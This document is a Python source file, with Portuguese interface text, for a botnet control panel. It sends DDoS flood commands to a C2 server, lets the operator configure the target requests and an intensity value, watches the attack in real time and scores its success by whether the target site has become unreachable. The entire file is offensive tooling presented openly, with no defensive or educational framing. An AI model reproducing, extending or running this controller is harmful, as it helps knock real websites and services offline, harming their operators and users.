import requests
import time
import os

C2_URL = "http://localhost:5000"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def menu():
    print("\n" + "="*40)
    print("   BOTNET CONTROL PANEL v2.0")
    print("="*40)
    print("1. Iniciar Ataque DDoS (Múltiplas Requisições)")
    print("2. Monitorar Logs (Real-time)")
    print("3. Sair")
    return input("Escolha uma opção: ")

def add_request():
    """Adiciona uma requisição ao ataque"""
    print("\n--- CONFIGURAÇÃO DE REQUISIÇÃO ---")
    url = input("URL (ex: http://target-server/api/endpoint): ").strip()
    if not url:
        print("[!] URL não pode estar vazia.")
        return None

    method = input("Método HTTP (GET/POST/PUT) [padrão: GET]: ").strip().upper() or "GET"
    if method not in ["GET", "POST", "PUT"]:
        print("[!] Método inválido. Usando GET.")
        method = "GET"

    headers_input = input("Headers customizados? (JSON, opcional, ex: {\"X-Custom\": \"value\"}): ").strip()
    headers = {}
    if headers_input:
        try:
            import json
            headers = json.loads(headers_input)
        except:
            print("[!] Headers inválido. Ignorando.")

    body = None
    if method in ["POST", "PUT"]:
        body = input("Body/Payload (opcional): ").strip() or None

    return {
        "url": url,
        "method": method,
        "headers": headers,
        "body": body
    }

def attack_ddos():
    """Configura e inicia um ataque com múltiplas requisições"""
    print("\n" + "="*40)
    print("   CONFIGURAÇÃO DE ATAQUE")
    print("="*40)

    requests_list = []
    print("\nAdicione até 5 requisições para o ataque:")

    for i in range(1, 6):
        print(f"\n[Requisição {i}]")
        req = add_request()
        if req:
            requests_list.append(req)
            print(f"[+] Requisição {i} adicionada: {req['method']} {req['url']}")

        if i < 5:
            add_more = input("Adicionar outra requisição? (s/n) [padrão: n]: ").strip().lower()
            if add_more != 's':
                break

    if not requests_list:
        print("[!] Nenhuma requisição configurada. Cancelando ataque.")
        return

    try:
        intensity = int(input("\nIntensidade (quantas vezes executar cada requisição): "))
        if intensity <= 0:
            intensity = 1
    except ValueError:
        print("[!] Intensidade deve ser um número. Usando 1.")
        intensity = 1

    payload = {
        "action": "flood",
        "requests": requests_list,
        "intensity": intensity
    }

    try:
        print("\n[*] Enviando comando para o C2...")
        resp = requests.post(f"{C2_URL}/admin/send_command", json=payload, timeout=5)
        if resp.status_code == 200:
            attack_data = resp.json()
            attack_id = attack_data.get('attack_id')
            print(f"[+] Ataque iniciado! ID: {attack_id}")
            print(f"[+] {len(requests_list)} requisição(ões) x {intensity} intensidade")

            monitor_attack(attack_id, requests_list[0].get('url'))
        else:
            print(f"[!] Erro do servidor: {resp.status_code}")
    except Exception as e:
        print(f"[-] Erro de conexão: {e}")

def monitor_attack(attack_id, target_url):
    """Monitora um ataque em tempo real até sua conclusão"""
    print("\n" + "="*50)
    print("   MONITORAMENTO DE ATAQUE EM TEMPO REAL")
    print("="*50)

    attack_completed = False
    start_time = time.time()

    try:
        while not attack_completed:
            clear_screen()
            print("=" * 50)
            print("   MONITORAMENTO DE ATAQUE EM TEMPO REAL")
            print("=" * 50)
            print(f"\nID do Ataque: {attack_id}")
            print(f"Tempo decorrido: {int(time.time() - start_time)}s\n")

            try:
                resp = requests.get(f"{C2_URL}/get_attack_status/{attack_id}", timeout=5)
                if resp.status_code == 200:
                    attack_info = resp.json()

                    print(f"Status: {attack_info.get('status', 'unknown')}")
                    print(f"Requisições Enviadas: {attack_info.get('requests_sent', 0)}")
                    print(f"Requisições Bem-sucedidas: {attack_info.get('requests_successful', 0)}")
                    print(f"Requisições Falhadas: {attack_info.get('requests_failed', 0)}")

                    if attack_info.get('status') == 'completed':
                        attack_completed = True
                        print("\n[+] Ataque concluído! Aguarde análise de acessibilidade...")
            except:
                pass

            if not attack_completed:
                time.sleep(2)

        print("\n" + "="*50)
        print("   ANÁLISE DE EFETIVIDADE")
        print("="*50)

        print(f"\n[*] Testando acessibilidade de {target_url}...")
        time.sleep(2)

        try:
            test_response = requests.get(target_url, timeout=10)

            if test_response.status_code == 200:
                print(f"\n[!] STATUS: SITE AINDA ACESSÍVEL ❌")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Tempo de resposta: {test_response.elapsed.total_seconds():.2f}s")
                print(f"    Efetividade: 0% - Ataque não teve efeito esperado")
            elif test_response.status_code >= 500:
                print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Efetividade: 100% - Ataque bem-sucedido!")
            else:
                print(f"\n[?] STATUS: RESPOSTA ANÔMALA ⚠")
                print(f"    Código HTTP: {test_response.status_code}")
                print(f"    Efetividade: Parcial - Site retornou status inesperado")

        except requests.exceptions.Timeout:
            print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
            print(f"    Erro: Timeout na requisição")
            print(f"    Efetividade: 100% - Ataque bem-sucedido!")

        except requests.exceptions.ConnectionError:
            print(f"\n[+] STATUS: SITE INDISPONÍVEL ✓")
            print(f"    Erro: Impossível conectar")
            print(f"    Efetividade: 100% - Ataque bem-sucedido!")

        except Exception as e:
            print(f"\n[?] Erro ao testar acessibilidade: {e}")

        print("\n" + "="*50)
        input("\nPressione Enter para retornar ao menu...")

    except KeyboardInterrupt:
        print("\n[*] Monitoramento cancelado pelo usuário.")

def monitor_logs():
    """Monitora os logs gerais do C2"""
    print("\n[*] Conectando ao stream de logs... (Ctrl+C para parar)")
    try:
        while True:
            resp = requests.get(f"{C2_URL}/admin/get_logs", timeout=5)
            logs = resp.json()

            if not logs:
                print("[!] Sem logs no momento...")
            else:
                clear_screen()
                print("\n" + "="*50)
                print("   MONITORAMENTO DE ATIVIDADE DA BOTNET")
                print("="*50)
                print(f"Total de eventos: {len(logs)}\n")
                print("-" * 50)

                for log in logs[-15:]:
                    ts = log.get('timestamp', '??:??:??')
                    bot = log.get('bot_id', '??')
                    msg = log.get('message', '...')
                    print(f"[{ts}] [{bot}] {msg}")

            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Monitoramento encerrado.")
    except Exception as e:
        print(f"[!] Erro no monitoramento: {e}")

def main():
    while True:
        choice = menu()
        if choice == '1':
            attack_ddos()
        elif choice == '2':
            monitor_logs()
        elif choice == '3':
            print("[*] Encerrando...")
            break
        else:
            print("[!] Opção inválida.")

if __name__ == "__main__":
    main()
